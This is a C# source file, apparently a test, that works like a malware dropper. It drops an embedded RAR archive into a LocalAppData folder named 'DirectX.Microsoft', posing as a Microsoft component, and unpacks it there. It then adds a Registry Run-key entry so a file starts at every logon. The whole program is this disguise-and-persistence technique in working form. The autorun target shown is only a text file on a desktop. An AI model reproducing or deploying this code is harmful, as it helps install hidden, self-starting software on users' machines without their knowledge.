using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpCompress.Reader;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;
using SharpCompress.Common;
using SharpCompress;
using Microsoft.Win32;

namespace Extract_file
{
    class Program
    {




        static void Main(string[] args)
        {
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\DirectX.Microsoft");//создание папки в appdata/local
            var path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\DirectX.Microsoft";//переменная пути


            Extract(path, "file", "FloodFill_Queue.rar");
            extractor(path);

            const string name = "MyTestApplication";
            string ExePath = @"C:\Users\narzull\Desktop\112233\2.txt";
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            reg.SetValue(name, ExePath);

        }

        static void Extract(string Куда_извлекать, string Имя_папки, string Имя_ресурса)
        {
            const string nameSpace = "Extract_file";
            Assembly assembly = Assembly.GetCallingAssembly();
            using(Stream s = assembly.GetManifestResourceStream(nameSpace+ "." + (Имя_папки == "" ? "" : Имя_папки + ".")+ Имя_ресурса))
                using (BinaryReader r = new BinaryReader(s))
                    using(FileStream fs = new FileStream(Куда_извлекать + "\\" + Имя_ресурса,FileMode.OpenOrCreate))
                        using(BinaryWriter w = new BinaryWriter(fs))
                            w.Write(r.ReadBytes((int)s.Length));
        }

        static void extractor(string path)//разархивирование архива
        {
            using (Stream stream = File.OpenRead(path + @"\FloodFill_Queue.rar"))
            {
                var reader = ReaderFactory.Open(stream);
                while (reader.MoveToNextEntry())
                {
                    if (!reader.Entry.IsDirectory)
                    {

                        reader.WriteEntryToDirectory(path, ExtractOptions.ExtractFullPath | ExtractOptions.Overwrite);
                    }
                }
            }
        }




    }
}
